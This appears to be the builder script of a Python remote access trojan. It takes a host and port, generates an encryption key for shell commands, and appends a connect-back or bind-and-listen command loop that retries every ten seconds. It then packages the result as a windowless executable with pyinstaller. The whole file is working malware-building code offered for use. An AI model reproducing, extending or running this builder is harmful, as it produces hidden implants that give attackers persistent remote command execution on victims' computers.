from colorama import Fore
from platform import system as OStype
from cryptography.fernet import Fernet
from os import system,chdir,getcwd
from os.path import isdir
def clear():
    if "windows" in OStype().lower():
        system("cls")
    else :
        system("clear")
def rgb(r, g, b):
    return "\033[38;2;{};{};{}m".format(r, g, b)
def main(mode,path):
    clear()
    if path:
        code =open(path)
    else:
        if 'windows' in OStype().lower():
            code =open(f'{__file__.replace("generator.py","")}RATS\\RAT.py','r')
        else :
            code =open(f'{__file__.replace("generator.py","")}RATS/RAT.py','r')
    mainCode=code.read()
    selection=input(f"""
{rgb(255, 51, 51)}  ▄████ ▓█████  ███▄    █ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
{rgb(255, 26, 26)} ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
{rgb(255, 0, 0)}▒██░▄▄▄░▒███   ▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
{rgb(230, 0, 0)}░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
{rgb(204, 0, 0)}░▒▓███▀▒░▒████▒▒██░   ▓██░░▒████▒░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
{rgb(179, 0, 0)} ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
{rgb(153, 0, 0)}  ░   ░  ░ ░  ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░
{rgb(128, 0, 0)}░ ░   ░    ░      ░   ░ ░    ░     ░░   ░   ░   ▒    ░      ░ ░ ░ ▒    ░░   ░ 
      ░    ░  ░         ░    ░  ░   ░           ░  ░            ░ ░     ░     
{Fore.LIGHTCYAN_EX}                                                                        
[ 1 ] Convert to executable file for {OStype()}  [ 2 ] Exit 

Enter your selection : """)
    if selection == '1':
        host=input(f"{rgb(255, 213, 128)}\n\n[ * ] Enter the host : {Fore.RESET}")
        while 1:
            try:
                port=int(input(f"{rgb(255, 213, 128)}\n[ * ] Enter the port : {Fore.RESET}"))
                break
            except ValueError : 
                print(f"{Fore.LIGHTRED_EX}\n\n[ ! ] Value Error")
        key=Fernet.generate_key()
        while 1:
            inp=input(f"{rgb(69, 127, 252)}Your encryption / decryption key : {rgb(255, 0, 0)}{key.decode()}\n\nNote: Keep this key in a safe place because shell commands are encrypted / decrypted with this key\n\nAre you agree[Y/n] ? ").lower().strip()
            if inp=='y' or inp=='yes' or inp=='i agree':
                break
        while 1:
            pathToSave=input(f"{Fore.LIGHTMAGENTA_EX}\n\n\nEnter a folder to save the files: ")
            if isdir(pathToSave):
                if pathToSave[len(pathToSave)-1]=='/':
                    pathToSave=pathToSave[0:len(pathToSave)-1]
                break
            else :
                print(f"{Fore.LIGHTRED_EX}\n[ ! ] Value Error")
        if mode=='client':
            mainFunc=f'''
def main():
    addrs=("{host}",{port})   
    key=b'{key.decode()}'
    sock=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    sock.connect(addrs)
    while 1:
        command=sock.recv(1024).decode()
        if command :
            commandRunner(sock,command,key)
while 1:
    try:
        main()
    except : 
        sleep(10)
        '''
        elif mode=='server':
            mainFunc=f'''
def main():      
    addrs=("{host}",{port})   
    key=b'{key.decode()}'
    sock=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    sock.bind(addrs)
    sock.listen(1)
    conn,addr=sock.accept()
    while 1:
        command=conn.recv(1024).decode()
        commandRunner(conn,command,key)
while 1:
    try:
        main()
    except : 
        sleep(10)
        '''
        mainCode+=mainFunc
        currPath=getcwd()
        chdir(pathToSave)
        with open('pyRAT.pyw','w') as pyFile:
            pyFile.write(mainCode)
            pyFile.close()
        system(f"pyinstaller --onefile pyRAT.pyw")
        clear()
        chdir(currPath)
        input(f"{rgb(0,255,0)}[ * ] Done (The executable file for {OStype()} is located in the /dist path)! \n\nEnter to continue : {Fore.RESET}")
    elif selection=='2':
        return 1